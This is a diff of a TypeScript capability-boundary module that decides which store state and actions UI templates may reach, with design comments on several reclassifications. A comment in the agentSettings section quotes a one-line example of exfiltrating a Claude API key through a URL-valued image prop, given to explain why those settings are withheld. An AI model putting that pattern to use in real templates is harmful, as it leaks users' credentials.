@@ -22,8 +22,8 @@
  *   probe.
  * - **State is tagged, actions are not.** Only members declared `state` are marked with
  *   `markReactive`, and `walkPath` now calls only tagged accessors. That closes the other half of
- *   the hole: `$store` used to *invoke* any function it walked past, so naming a zero-argument
- *   method in a `$store` path called it during paint.
+ *   the hole: a store read used to *invoke* any function it walked past, so naming a zero-argument
+ *   method in one called it during paint.
  * - **Groups are the grant unit, per-member declarations are the mechanism.** Nobody can review a
  *   list of 388 method names; "this template can manage your library and your account" is
  *   reviewable. Groups are what a marketplace listing will show a human when chrome templates
@@ -37,7 +37,7 @@
  * store member fails that test until it is classified, so this cannot quietly fall behind the code
  * it describes — the failure mode an allowlist beside the thing it allows usually has.
  */
-import { markReactive } from '@we/schema-shared';
+import { isExpressionToken, markReactive, parseExpression, referencedPaths } from '@we/schema-shared';
 
 /**
  * What a group of capabilities lets a template do, in the words a person would use.
@@ -119,7 +119,7 @@ const WIRING = 'wiring' as const;
 
 interface MemberSpec {
   group: CapabilityGroup;
-  /** `state` is read through `$store` and tagged reactive; `action` is called through `$action`. */
+  /** `state` is read in expressions and tagged reactive; `action` is called through `$action`. */
   kind: 'state' | 'action';
   /**
    * Irreversible, or expensive to reverse. Not a grant of its own — a flag the host reads to decide
@@ -179,7 +179,10 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     me: state('identity'),
     host: state('session'),
     hostAccount: state('session'),
+    isGuest: state('session'),
     isDevelopment: state('session'),
+    devTools: state('session'),
+    setDevTools: action('session'),
     login: action('session'),
     createAgent: action('session'),
     clearPasswordError: action('session'),
@@ -242,6 +245,7 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     aiForm: state('runtime-admin'),
     aiPresetOptions: state('runtime-admin'),
     aiFormComplete: state('runtime-admin'),
+    aiFormDirty: state('runtime-admin'),
     languages: state('runtime-admin'),
     trustedAgents: state('runtime-admin'),
     authorizedApps: state('runtime-admin'),
@@ -298,7 +302,7 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     currentDataset: state('content'),
     currentDatasetUri: state('content'),
     currentDatasetCid: state('content'),
-    currentDatasetModels: state('content'),
+    currentDatasetEntities: state('content'),
     isWeSpace: state('navigation'),
     joinedSpaceCids: state('navigation'),
     datasetsLoaded: state('navigation'),
@@ -317,14 +321,14 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
       Agent settings and the datasets that hold them.
 
       `agentSettings` carries `claudeApiKey`. Exposed, a template needed one styled element —
-      `bgImage: { $concat: ['https://…?k=', { $store: 'datasetStore.agentSettings.claudeApiKey' }] }`
+      `bgImage: { $: '`https://…?k=${datasetStore.agentSettings.claudeApiKey}`' }`
       — to exfiltrate it on paint. Any URL-valued prop is a network channel, so this is not fixable
       by watching for suspicious actions.
 
-      The root/global/marketplace handles go with it, and not only for tidiness: they are what a
-      `$query`'s `dataset` option resolves against, so leaving them reachable would let a template
-      read the same settings the long way round. `agent`-tier surfaces that genuinely need a
-      setting expose it as a named accessor rather than the whole record.
+      The root handle goes with it, and not only for tidiness: it is what a `$query`'s `dataset`
+      option resolves against, so leaving it reachable would let a template read the same settings
+      the long way round. `agent`-tier surfaces that genuinely need a setting expose it as a named
+      accessor rather than the whole record.
     */
     agentSettings: WIRING,
     /*
@@ -334,12 +338,29 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     */
     rootDataset: state('agent'),
     testDataset: WIRING,
-    globalDataset: WIRING,
-    marketplaceDataset: WIRING,
+    /*
+      The global discovery space and the marketplace — shared neighbourhoods holding nothing of this
+      agent's, so nothing here needs the protection `agentSettings` has.
+
+      They were `WIRING` alongside it, on the reasoning above, and that broke two pieces of chrome
+      without anything noticing: the create-space modal reads `globalDataset` to decide whether to
+      offer "list in the global space", and the marketplace shelf queries with
+      `dataset: 'datasetStore.marketplaceDataset'`. Both resolved to nothing — the modal never
+      offered the listing and the shelf's queries had no dataset to run against. The tier-fit test
+      did not see it because it walked neither the slot nodes nor a query's `dataset` path; it walks
+      both now.
+
+      `navigation` because a template already reaches the same space as `globalSpaceId`; `library`
+      because reading the marketplace's listing is the act the library group names.
+    */
+    globalDataset: state('navigation'),
+    marketplaceDataset: state('library'),
     updateAgentSettings: WIRING,
     clearCurrentDataset: WIRING,
     trackDataset: WIRING,
     provideAutoInterpretGate: WIRING,
+    provideExtractionCandidates: WIRING,
+    provideCallExtraction: WIRING,
     onDatasetRemoved: WIRING,
     initSystemDatasets: WIRING,
     loadDatasets: WIRING,
@@ -350,9 +371,16 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
   profileStore: {
     profiles: state('identity'),
     ownProfile: state('identity'),
+    ownProfileLoaded: state('identity'),
     fetchProfile: action('identity'),
     pendingAvatar: state('agent'),
     setPendingAvatar: action('agent'),
+    // 'agent' rather than 'identity': needsName reports something about the viewer's own account
+    // and its two actions write to it, which is the agent group's whole distinction from reading
+    // the directory. A template that merely paints has no business asking whether you are unnamed.
+    needsName: state('agent'),
+    saveNameFromPrompt: action('agent'),
+    dismissNamePrompt: action('agent'),
     updateOwnProfile: action('agent'),
     updateProfileImage: action('agent'),
     clearProfileImage: action('agent'),
@@ -383,6 +411,7 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
 
     // ── signals ──
     createSignalType: action('signals'),
+    setSignalTypeRetired: action('signals'),
     // The vocabulary of connections, alongside the vocabulary of reactions — same tier, same act:
     // a community naming what it means by something.
     createRelationshipType: action('signals'),
@@ -395,13 +424,17 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     sharedSpaces: state('navigation'),
     orderedSidebarItems: state('navigation'),
     routeSpaceUnjoined: state('navigation'),
+    spacePath: state('navigation'),
     joiningSpace: state('navigation'),
     joinSlow: state('navigation'),
     joinError: state('navigation'),
     joinSpace: action('navigation'),
     navigateToSpace: action('navigation'),
+    openRecordRef: action('navigation'),
     canAdministerSpace: action('navigation'),
+    canAdministerCurrentSpace: state('navigation'),
     copyShareLink: action('navigation'),
+    copyGuestLink: action('navigation'),
     activeModules: state('navigation'),
     moduleLaunchers: state('navigation'),
     launchModule: action('navigation'),
@@ -447,6 +480,27 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
       indicator that silently never rendered.
     */
     autoInterpret: state('space-settings'),
+    /*
+      `content`, not `space-settings`, and the difference is who may press it.
+
+      The space-wide switch above administers the space. This is one conversation's own answer,
+      written beside that call by whoever is in it — the same layer `setExtractionTarget` writes at,
+      and the same reason: stopping a standing pass mid-meeting is about that meeting, and gating it
+      on administering the space makes the honest response "leave the call".
+    */
+    autoInterpretForCall: action('content'),
+    /*
+      A capability's settings, at each of the three levels a screen can edit.
+
+      `space-settings` for all three reads: the rows carry what the community decided, which every
+      member can already see on the space, and the two personal lists are this agent's own answers
+      about themselves. None of them is a grant to change anything — the setters below are.
+    */
+    spaceModuleSettings: state('space-settings'),
+    myModuleSettings: state('space-settings'),
+    agentModuleSettings: state('space-settings'),
+    extractionTargets: state('space-settings'),
+    setExtractionTarget: action('space-settings'),
     shareExtractionDetail: state('space-settings'),
     setShareExtractionDetail: action('space-settings'),
     templateOverrideOptions: state('space-admin'),
@@ -468,6 +522,19 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     setSpaceDefaultTheme: hereOnly('space-settings', 1),
     setModuleEnabled: hereOnly('space-settings', 2),
     setAutoInterpret: hereOnly('space-settings', 1),
+    setAutoInterpretForCall: action('content'),
+    /*
+      Writing one. `hereOnly` on the community setter for the reason every other community write has
+      it: the space id is the last parameter, so a template that could pass one could reconfigure a
+      space it is not rendering — and this one can switch a capability off for every member.
+
+      Three arguments before the id, since a setting is named by its group and its key and the third
+      is the value; omitting the value clears the level rather than writing a falsy one.
+    */
+    setSpaceModuleSetting: hereOnly('space-settings', 3),
+    setMyModuleSetting: hereOnly('space-settings', 3),
+    // Personal and global, so there is no space id to withhold in the first place.
+    setAgentModuleSetting: action('space-settings'),
     /*
       Which sections the space has, and in what order — the community's decision, so the same tier
       and the same arity guard as `setModuleEnabled`.
@@ -513,6 +580,17 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     aiAvailable: state('space-settings'),
     generating: state('space-settings'),
     hintEntities: state('space-settings'),
+    /*
+      'content' rather than 'space-settings', unlike everything else on this store.
+
+      Capability groups name what a template is being trusted with, and this is read to *render*: a
+      feed showing what an extraction pass found on a call needs the list of models it could have
+      found, the same way it needs `recordStore.displays` to draw one. Grouping it with the model
+      wizard would make an ordinary card list ask for the capability that edits a space's vocabulary.
+    */
+    extractionCandidates: state('content'),
+    provideExtractionEnroller: WIRING,
+    extractionNeedsIdentity: state('space-settings'),
     relationshipTargets: state('space-settings'),
     identityOptions: state('space-settings'),
     hintEditor: state('space-settings'),
@@ -521,6 +599,7 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     cancelShapeWizard: action('space-settings'),
     setShapeField: action('space-settings'),
     setIdentityMember: action('space-settings'),
+    setExtractable: action('space-settings'),
     addProperty: action('space-settings'),
     addRelationship: action('space-settings'),
     removeMember: action('space-settings'),
@@ -546,6 +625,7 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     deleteShape: destructive('space-settings'),
     openHintEditor: action('space-settings'),
     closeHintEditor: action('space-settings'),
+    hintEditorDirty: state('space-settings'),
     setHintDraft: action('space-settings'),
     saveHintEditor: action('space-settings'),
     resetHintEditor: action('space-settings'),
@@ -557,7 +637,9 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     // container. Creating one is writing a record, which is the same act as posting — so it belongs
     // in the tier every template can reach, beside `spaceStore.createPost`.
     creatableEntities: state('content'),
+    displays: state('content'),
     recordDraft: state('content'),
+    recordDraftDirty: state('content'),
     recordErrors: state('content'),
     savingRecord: state('content'),
     lastCreatedId: state('content'),
@@ -627,8 +709,14 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     previewThemeScope: action('editor'),
     setThemeScopeGlobal: action('agent'),
     setUseTemplateTheme: action('agent'),
-    restorePersonalTheme: action('library'),
-    clearSpaceTheme: action('space-admin'),
+    /*
+      Host wiring, both: the theme resolver calls them as the agent moves between spaces, and
+      nothing a template could say with them is not already said by applyTheme and clearSpaceThemePin.
+      They were classified as API, which listed them in the reference with a description that had to
+      say "prefer something else" — the tell that a member was constrained rather than designed in.
+    */
+    restorePersonalTheme: WIRING,
+    clearSpaceTheme: WIRING,
     startEditing: action('editor'),
     // The editor tier, with `startEditing` — this is the second half of the same gesture: open the
     // theme editor, and say which role you came for. Nothing a template has any business setting.
@@ -685,14 +773,27 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     uninstallTemplate: action('library'),
     installFromMarketplace: action('library'),
     installToSpace: action('space-settings'),
+    /*
+      The install dialog's own three members.
+
+      `library`, and at the chrome tier only — the dialog is host chrome by design (a dialog
+      vouching for a template must not be drawn by one), so nothing at the space tier has any use
+      for them, and `confirmInstall` writing on a click a space template could make is exactly the
+      confirmation being bypassed. See InstallPrompt.schema.ts.
+    */
+    pendingInstall: state('library'),
+    confirmInstall: action('library'),
+    cancelInstall: action('library'),
     setDefaultTemplate: action('library'),
     saveTemplate: action('editor'),
     saveTemplateAs: action('editor'),
     publishToSpace: action('library'),
     deleteMarketplaceTemplate: destructive('library'),
     publishToMarketplace: action('library'),
-    isBuiltInTemplate: action('library'),
-    isInstalled: action('library'),
+    // Queries that answer with a value, which $action cannot read: templateManagementList carries
+    // isBuiltIn and isInstalled per row, which is the form a template can use.
+    isBuiltInTemplate: WIRING,
+    isInstalled: WIRING,
 
     /*
       Wiring, and `updateTemplate`/`replaceTemplate` especially.
@@ -713,15 +814,17 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     loadSpaceTemplates: WIRING,
     refreshSpaceTemplates: action('appearance'),
     clearSpaceTemplates: WIRING,
-    getTemplateModel: WIRING,
+    getTemplateRecord: WIRING,
   },
 
   routeStore: {
     currentPath: state('view-state'),
     segments: state('view-state'),
+    templateSegments: state('view-state'),
     params: state('view-state'),
     navigate: action('navigation'),
     setParam: action('view-state'),
+    back: action('navigation'),
 
     setNavigateFunction: WIRING,
     setCurrentPath: WIRING,
@@ -746,6 +849,53 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
       user's behalf.
     */
     setCreateSpaceOpen: action('navigation'),
+    /*
+      The host's delete confirmation.
+
+      `wiring` for all four, deliberately, and this is the one classification in the file where
+      being reachable would defeat the member's whole purpose. The dialog stands between a space
+      template and every destructive action it can name; a template that could read
+      `pendingDestructive` could tell whether the dialog was up, and one that could call
+      `confirmDestructive` could answer its own question. `requestDestructive` is the guard itself,
+      passed to `buildTemplateBag` by the host.
+
+      Chrome reaches them the way it reaches everything else the templates may not touch: it is not
+      in a bag at all. `DestructivePrompt.schema.ts` is a host slot, rendered against the chrome
+      bag — so these must appear in the chrome tier too, and `wiring` would exclude them from both.
+      They are `host-layout`, the group chrome-only surfaces already live in.
+    */
+    /*
+      Which modules' chrome is live here, injected by `SpaceStore` — see `ShellStore.moduleGate`.
+
+      Wiring in the strictest sense: it is one store handing another an answer it cannot compute,
+      and a template able to call it could make every module's panel claim room it is not using.
+    */
+    provideModuleGate: WIRING,
+    provideTemplateSaver: WIRING,
+    pendingDestructive: state('host-layout'),
+    confirmDestructive: action('host-layout'),
+    cancelDestructive: action('host-layout'),
+    requestDestructive: WIRING,
+    /*
+      The space-settings panel — which host surface is open, and asking for it.
+
+      `navigation`, on exactly the reasoning above and the reasoning behind `activeShellView`: these
+      say "show me the app's own settings for this space" and nothing more. What that panel then
+      permits is decided inside it, by `canAdminister`, not by whoever opened it — so a template
+      offering the button is offering a destination, not a capability.
+
+      That it is space-tier is load-bearing rather than incidental: the About *view* carries a pencil
+      that opens this, and a view renders at `SPACE_TIER`. Chrome-tiering it would leave that pencil
+      pointing at something it is not allowed to call.
+    */
+    spaceSettingsOpen: state('navigation'),
+    spaceSettingsTab: state('navigation'),
+    openSpaceSettings: action('navigation'),
+    closeSpaceSettings: action('navigation'),
+    toggleSpaceSettings: action('navigation'),
+    // Where the host should put that panel — read by the dock resolver in TypeScript, never by a
+    // schema, which addresses a dock through `shellStore.dockGeometry` instead.
+    spaceSettingsEdge: WIRING,
     scrollToId: action('view-state'),
 
     takePendingPath: WIRING,
@@ -756,7 +906,7 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
       These were `WIRING`, on the reasoning that dock geometry is "the host's layout arithmetic,
       driven by a resize handle it owns". The arithmetic is the host's; the handle is not code. Docks
       are built as *schema* by `dockRegistry.dockFrame` — the geometry arrives through
-      `{ $store: 'shellStore.dockGeometry.<id>.<field>' }` and the drag through
+      `{ $: 'shellStore.dockGeometry.<id>.<field>' }` and the drag through
       `{ $action: 'shellStore.beginDockResize' }` — so marking them wiring removed them from every
       bag, chrome's included. Every docked panel rendered as empty space with no resize rail.
 
@@ -767,12 +917,16 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     */
     dockGeometry: state('host-layout'),
     contentInset: state('host-layout'),
+    coveredInset: state('host-layout'),
     dockResizing: state('host-layout'),
     // Read by the sidebar and the module rail, which hide while a panel is maximised.
     panelMaximised: state('host-layout'),
     // Written by the host layout, which can see the editor's widths — never by a template.
     beginDockResize: action('host-layout'),
     resizeDock: action('host-layout'),
+    // The divider between two stacked panels — one number, because a boundary has one degree of
+    // freedom and what one panel gains the other gives up.
+    resizeColumn: action('host-layout'),
     endDockResize: action('host-layout'),
     /*
       Moving a panel, which is the same capability as resizing one and is listed for the same reason.
@@ -789,14 +943,44 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     // The gaps in a strip, and which one a drop would take — what makes reordering a dock possible.
     insertSlots: state('host-layout'),
     activeInsert: state('host-layout'),
+    dragGhost: state('host-layout'),
     insertDock: action('host-layout'),
     beginDockMove: action('host-layout'),
+    raiseDock: action('host-layout'),
     moveDock: action('host-layout'),
+    beginTabDrag: action('host-layout'),
+    moveTab: action('host-layout'),
+    endTabDrag: action('host-layout'),
     endDockMove: action('host-layout'),
     snapDock: action('host-layout'),
     toggleMaximiseDock: action('host-layout'),
     fitDock: action('host-layout'),
     toggleDockDisplace: action('host-layout'),
+    toggleCollapseDock: action('host-layout'),
+    breakOut: action('host-layout'),
+    returnHome: action('host-layout'),
+    stackDock: action('host-layout'),
+    insertHome: action('host-layout'),
+    saveArrangementAsTemplate: action('host-layout'),
+    // Whether a panel has been dragged away from what the interface declared, and the way back.
+    layoutPinned: state('host-layout'),
+    resetDockToLayout: action('host-layout'),
+    // The same question and the same answer about the whole arrangement, for chrome that is not a
+    // panel's own titlebar — a panel somebody closed has no titlebar left to ask from.
+    layoutDirty: state('host-layout'),
+    // Read by a module's own dock frame, to know whether the interface is supplying its contents.
+    panelSupplied: state('host-layout'),
+    resetTemplateLayout: action('host-layout'),
+    layoutNames: state('host-layout'),
+    activeLayout: state('host-layout'),
+    saveLayout: action('host-layout'),
+    applyLayout: action('host-layout'),
+    deleteLayout: action('host-layout'),
+    // Dismissing and restoring a panel the interface itself supplied. What the titlebar's close
+    // button calls, and reachable by the template that declared the panel — which is the only way
+    // back to one that has been closed.
+    closeTemplatePanel: action('host-layout'),
+    openTemplatePanel: action('host-layout'),
   },
 
   presenceStore: {
@@ -831,6 +1015,10 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
     activity: state('presence'),
     runningCount: state('presence'),
     hasActivity: state('presence'),
+    runningPasses: state('presence'),
+    settledPasses: state('presence'),
+    settledCount: state('presence'),
+    detailWithheld: state('presence'),
     dismissSettled: action('view-state'),
   },
 
@@ -920,10 +1108,11 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
   },
 
   /**
-   * Model mutations. Reads need no entry — `$query` goes through the renderer's own bindings, and a
-   * template that can render a space's data is the entire point.
+   * Record mutations — writing one instance of an entity. Reads need no entry: `$query` goes
+   * through the renderer's own bindings, and a template that can render a space's data is the
+   * entire point.
    */
-  model: {
+  record: {
     create: action('content'),
     update: action('content'),
     delete: destructive('content'),
@@ -939,15 +1128,15 @@ const ALWAYS_PRESENT = new Set([
   '$useQueryIR',
   '$me',
   '$currentDataset',
-  '$getModel',
-  '$getModelForPerspective',
+  '$getEntity',
+  '$getEntitiesForPerspective',
   '$queryAdapter',
   '$identities',
   '$ephemeral',
   /*
-    The `$source` registry — computed rows and values a template may draw on.
+    The host-source registry — computed rows and values a template may call on.
 
-    Present in every bag for the same reason `$getModel` is: it is a host-provided capability that
+    Present in every bag for the same reason `$getEntity` is: it is a host-provided capability that
     templates are meant to reach, not store state anyone needs protecting from. Its members are pure
     synchronous functions the host chose to register, so there is nothing here to gate — a template
     that can call `calendarMonth` can compute a month, which is the entire point of registering it.
@@ -960,13 +1149,13 @@ const ALWAYS_PRESENT = new Set([
 ]);
 
 /**
- * Module stores, with every function tagged so `$store` can still read module state.
+ * Module stores, with every function tagged so an expression can still read module state.
  *
  * **This is deliberately permissive, and the one place the boundary is not yet drawn.** A module's
  * store is a flat record whose members are a mix of raw signals, derived closures and actions, and
  * nothing distinguishes them — so tagging selectively is not possible without the module saying
- * which is which. Tagging all of them keeps `{ $store: 'modules.transcribe.level' }` working and
- * leaves `{ $store: 'modules.call.leave' }` callable during paint, exactly as before.
+ * which is which. Tagging all of them keeps `{ $: 'modules.transcribe.level' }` working and
+ * leaves `modules.call.leave` callable during paint, exactly as before.
  *
  * The reason that is acceptable *today* is that modules are bundled: they are chosen by the
  * deployment's seed and ship with the app, at the same trust level as the app itself. It stops being
@@ -975,15 +1164,19 @@ const ALWAYS_PRESENT = new Set([
  * it, and this function tags only what was marked. Left as a follow-up rather than done here because
  * it is a contract change across five modules, and doing it badly would be worse than doing it late.
  */
-function taggedModuleStores(modules: Record<string, Record<string, unknown>>): Record<string, unknown> {
+function taggedModuleStores(
+  modules: Record<string, Record<string, unknown>>,
+  chromeOnly?: Record<string, readonly string[]>,
+): Record<string, unknown> {
   const out: Record<string, unknown> = {};
   for (const [id, store] of Object.entries(modules ?? {})) {
     if (!store || typeof store !== 'object') continue;
+    // Members this module keeps for host chrome — absent below, not blocked. See `ModuleStoreSurface`.
+    const withheld = new Set(chromeOnly?.[id] ?? []);
     out[id] = Object.fromEntries(
-      Object.entries(store).map(([name, member]) => [
-        name,
-        typeof member === 'function' ? markReactive(member) : member,
-      ]),
+      Object.entries(store)
+        .filter(([name]) => !withheld.has(name))
+        .map(([name, member]) => [name, typeof member === 'function' ? markReactive(member) : member]),
     );
   }
   return out;
@@ -992,8 +1185,30 @@ function taggedModuleStores(modules: Record<string, Record<string, unknown>>): R
 export interface BuildBagOptions {
   /** Which capability groups this template was granted. */
   grants: readonly CapabilityGroup[];
-  /** Called before a `destructive` action runs. Returning false refuses it. */
-  onDestructive?: (path: string) => boolean;
+  /**
+   * Called before a `destructive` action runs. Resolving false refuses it.
+   *
+   * Asynchronous, and that is the whole reason this was never wired to anything. A confirmation is
+   * a question put to a person, so a guard that had to answer *synchronously* could only ever have
+   * been a policy check — and there is no policy here, there is a human. The option existed, three
+   * call sites passed nothing, and every destructive action a space template could name ran on one
+   * unqualified click.
+   *
+   * Awaiting it makes a destructive action async from the template's point of view, which costs
+   * nothing: `$action` already awaits, and `onSuccess`/`onError`/`onFinally` are defined in terms
+   * of the returned promise. A refusal resolves `undefined` — the same nothing a blocked action
+   * resolves — so `onSuccess` does not fire on a cancel.
+   */
+  onDestructive?: (path: string, args: unknown[]) => boolean | Promise<boolean>;
+  /**
+   * Store members each module withholds from a space template, keyed by module id.
+   *
+   * Passed by the host from the module registry, rather than read here, for the reason this whole
+   * file exists to serve: what a module publishes is the module's declaration, and the boundary
+   * should not have to know the names. Only meaningful below the chrome tier — chrome *is* the
+   * audience these members are kept for. See `ModuleStoreSurface`.
+   */
+  moduleChromeOnly?: Record<string, readonly string[]>;
 }
 
 /**
@@ -1016,13 +1231,17 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
 
       `moduleStores` is one object the registry mutates in place as modules register and unregister,
       so copying its contents once would freeze the module set at whatever had loaded when this bag
-      was built — and `{ $store: 'modules.notes.open' }` is documented as the way a template depends
+      was built — and `{ $: 'modules.notes.open' }` is documented as the way a template depends
       on an optional module.
     */
     if (key === 'modules') {
       Object.defineProperty(bag, key, {
         enumerable: true,
-        get: () => taggedModuleStores(stores[key] as Record<string, Record<string, unknown>>),
+        get: () =>
+          taggedModuleStores(
+            stores[key] as Record<string, Record<string, unknown>>,
+            granted.has('host-layout') ? undefined : options.moduleChromeOnly,
+          ),
       });
       continue;
     }
@@ -1030,7 +1249,7 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
     /*
       Renderer bindings, by descriptor rather than by value.
 
-      `$getModel`, `$currentDataset`, `$queryAdapter` and the rest are defined on the host's bag as
+      `$getEntity`, `$currentDataset`, `$queryAdapter` and the rest are defined on the host's bag as
       *getters* that delegate to a memo, because the connector's ports do not exist until after
       connect. Reading them here would have captured their pre-connect value — `undefined` — and
       pinned it, which is not a subtle failure: every `$query` in every template resolves to nothing
@@ -1057,7 +1276,7 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
 
       if (spec.kind === 'state') {
         // Tagged so `walkPath` will call it. Anything untagged is data to the resolver, never
-        // something to invoke — which is what stops a `$store` path from running an action.
+        // something to invoke — which is what stops a store read from running an action.
         filtered[name] = typeof member === 'function' ? markReactive(member) : member;
         continue;
       }
@@ -1076,7 +1295,7 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
       if (spec.destructive && options.onDestructive) {
         const guard = options.onDestructive;
         const bound = method;
-        method = (...args: unknown[]) => (guard(path) ? bound(...args) : undefined);
+        method = async (...args: unknown[]) => ((await guard(path, args)) ? bound(...args) : undefined);
       }
 
       filtered[name] = method;
@@ -1095,7 +1314,7 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
  *
  * Because "resolves to nothing" is invisible. A synced space template referencing
  * `sessionStore.logout` renders a Sign out button that takes the click and does nothing, and a
- * `{ $store: 'runtimeStore.trustedAgents' }` renders an empty list rather than an error — a
+ * `{ $: 'runtimeStore.trustedAgents' }` renders an empty list rather than an error — a
  * template that is quietly half-broken, in a way neither its author nor the person looking at it
  * can see. Reading the references before accepting the template turns a silent hole into a
  * sentence, at install time, naming what it wanted.
@@ -1106,7 +1325,7 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
 export interface SurfaceReference {
   /** The store path as written — `sessionStore.logout`. */
   path: string;
-  /** How it was reached: through `$store` or through `$action`. */
+  /** How it was reached: read in an expression, or called through `$action`. */
   via: 'store' | 'action';
   /** The group it belongs to, or null when the member is not classified at all. */
   group: CapabilityGroup | null;
@@ -1124,6 +1343,20 @@ export interface SurfaceInspection {
 /** Store names the bag always provides, so a reference to one is never blocked. */
 const UNGATED_ROOTS = new Set([...ALWAYS_PRESENT, 'modules']);
 
+/** Roots an expression may start from that are not stores, and so are never classified. */
+const EXPRESSION_ROOTS = new Set([
+  'local',
+  'me',
+  'currentDataset',
+  'event',
+  'arg',
+  'result',
+  'index',
+  'prev',
+  'surface',
+  'item',
+]);
+
 function classify(path: string): { store: string; member: string; spec: Classification | undefined } | null {
   const [store, member] = path.split('.');
   if (!store || !member) return null;
@@ -1131,7 +1364,7 @@ function classify(path: string): { store: string; member: string; spec: Classifi
 }
 
 /**
- * Walk any schema-shaped value, collecting every `$store` and `$action` reference.
+ * Walk any schema-shaped value, collecting every store read in an expression and every `$action`.
  *
  * Structural rather than typed on `SchemaNode`, because references live in props, in nested
  * operator objects, in `$each` items, in route trees and in handler arrays — everywhere. A walk
@@ -1146,8 +1379,35 @@ function collectReferences(value: unknown, into: { path: string; via: 'store' | 
   if (!value || typeof value !== 'object') return;
 
   const node = value as Record<string, unknown>;
-  if (typeof node.$store === 'string') into.push({ path: node.$store, via: 'store' });
   if (typeof node.$action === 'string') into.push({ path: node.$action, via: 'action' });
+  /*
+    An expression names stores as bare paths — `spaceStore.members`, `modules.notes.open`. Every
+    dotted root the expression reads is reported as a store reference; roots that are not stores
+    (`local`, `item`, `me`) are dropped by `classify` below exactly as an ungated store root is,
+    so there is no second list of names to keep in step. A source that does not parse names
+    nothing, which is right: it resolves to nothing at paint too, and the validator is where the
+    syntax error is reported.
+  */
+  if (isExpressionToken(node)) {
+    try {
+      for (const { root, path } of referencedPaths(parseExpression(node.$))) {
+        if (path.length > 0) into.push({ path: [root, ...path].join('.'), via: 'store' });
+      }
+    } catch {
+      // A syntax error is the validator's to report.
+    }
+  }
+  /*
+    A query's `dataset` is a store path too — `dataset: 'datasetStore.marketplaceDataset'` — and the
+    renderer resolves it against the same bag expressions read from. Left out of the walk, a dataset
+    the bag withholds is a query that quietly runs against nothing, which is how the marketplace
+    shelf came to render empty with every check passing. A query object always carries `entity`,
+    which is what tells this apart from any other prop that happens to be called `dataset`; the
+    `$`-prefixed forms (`$currentDataset`) are renderer bindings, not store members.
+  */
+  if (typeof node.entity === 'string' && typeof node.dataset === 'string' && !node.dataset.startsWith('$')) {
+    into.push({ path: node.dataset, via: 'store' });
+  }
 
   for (const entry of Object.values(node)) collectReferences(entry, into);
 }
@@ -1155,7 +1415,7 @@ function collectReferences(value: unknown, into: { path: string; via: 'store' | 
 /**
  * Inspect a template against a set of grants.
  *
- * A `$store` path may be deeper than `store.member` (`spaceStore.currentSpace.name`); only the
+ * A store path may be deeper than `store.member` (`spaceStore.currentSpace.name`); only the
  * first two segments decide access, which is exactly what the bag does — it filters members, and
  * everything below one travels with it.
  */
@@ -1178,7 +1438,19 @@ export function inspectTemplateSurface(schema: unknown, grants: readonly Capabil
     if (UNGATED_ROOTS.has(root)) continue;
 
     const parsed = classify(path);
-    if (!parsed || parsed.spec === undefined || parsed.spec === WIRING) {
+    /*
+      A root that is not a store at all — a `$each` variable, `local`, a name the expression bound.
+      Only an expression can produce one here (a store path always starts with a store), and it
+      is not a reference to anything the surface governs. A *typo'd* store name lands here too, and
+      that is the validator's to report against the known store list, not this walker's — this
+      answers "may you", not "does it exist".
+    */
+    if (
+      !parsed ||
+      (TEMPLATE_SURFACE[parsed.store] === undefined && (EXPRESSION_ROOTS.has(root) || !/Store$/.test(root)))
+    )
+      continue;
+    if (parsed.spec === undefined || parsed.spec === WIRING) {
       // Unclassified or host wiring. Blocked either way — an undecided member is not an open one —
       // but with a null group, so a caller can word "there is no such thing" differently from
       // "you may not have that".
